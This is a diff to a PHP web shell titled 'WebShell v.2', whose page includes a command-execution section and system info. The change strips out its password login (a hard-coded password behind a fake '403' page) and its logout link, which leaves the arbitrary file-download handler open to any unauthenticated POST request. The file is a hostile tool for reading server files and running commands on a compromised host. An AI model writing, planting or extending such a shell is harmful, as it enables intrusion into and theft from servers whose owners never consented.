@@ -1,10 +1,6 @@
 <?php
-session_start();
-
-define('PASSWORD', 'sh3ll');
-
 // File download — must run before any output
-if (!empty($_POST['dl_path']) && !empty($_SESSION['auth'])) {
+if (!empty($_POST['dl_path'])) {
     $dl = $_POST['dl_path'];
     if (file_exists($dl) && is_file($dl) && is_readable($dl)) {
         header('Content-Type: application/octet-stream');
@@ -15,41 +11,7 @@ if (!empty($_POST['dl_path']) && !empty($_SESSION['auth'])) {
     }
     $dl_error = 'File not found or not readable.';
 }
-
-// Auth
-if (isset($_POST['auth_pass'])) {
-    if ($_POST['auth_pass'] === PASSWORD) {
-        $_SESSION['auth'] = true;
-        session_regenerate_id(true);
-    } else {
-        $auth_error = true;
-    }
-}
-
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-if (empty($_SESSION['auth'])) { ?>
-<!DOCTYPE html><html><head><title>403</title>
-<style>
-body{background:#000;color:#ffaaaa;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(to bottom,rgba(255,30,0,0.04),rgba(255,30,0,0.04) 1px,transparent 1px,transparent 3px);pointer-events:none}
-body::after{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,0.85) 100%);pointer-events:none}
-form{position:relative;z-index:1;border:2px solid #ff2200;padding:30px;border-radius:8px;box-shadow:0 0 24px rgba(255,34,0,.5)}
-input[type=password]{background:#000;color:#ffaaaa;border:1px solid #ff2200;padding:8px;font-family:monospace;width:200px}
-input[type=submit]{background:#000;color:#ffaaaa;border:2px solid #ffaaaa;padding:8px 16px;cursor:pointer;font-family:monospace;margin-top:10px;display:block}
-.err{color:#ff5555;margin-top:8px}
-</style></head><body>
-<form method="POST">
-<b>Password:</b><br>
-<input type="password" name="auth_pass" autofocus><br>
-<input type="submit" value="[ Enter ]">
-<?php if (!empty($auth_error)) echo '<p class="err">Wrong password.</p>'; ?>
-</form></body></html>
-<?php exit; } ?>
+?>
 
 <!DOCTYPE html>
 <html>
@@ -293,15 +255,6 @@ code, pre {
     box-shadow: none;
 }
 
-/* ── Logout link ── */
-.logout-link {
-    float: right;
-    font-size: 12px;
-    color: #ff2200;
-    text-decoration: none;
-}
-.logout-link:hover { color: #ff5533; }
-
 /* ── Collapsible sysinfo ── */
 details {
     margin: 6px 0;
@@ -347,7 +300,6 @@ fieldset {
 
 <div class="pbp-container">
 
-<a class="logout-link" href="?logout=1">[ logout ]</a>
 <span class="shell-title">WebShell v.2 &lt;:~</span><br><br>
 
 <!-- ── Command execution ── -->
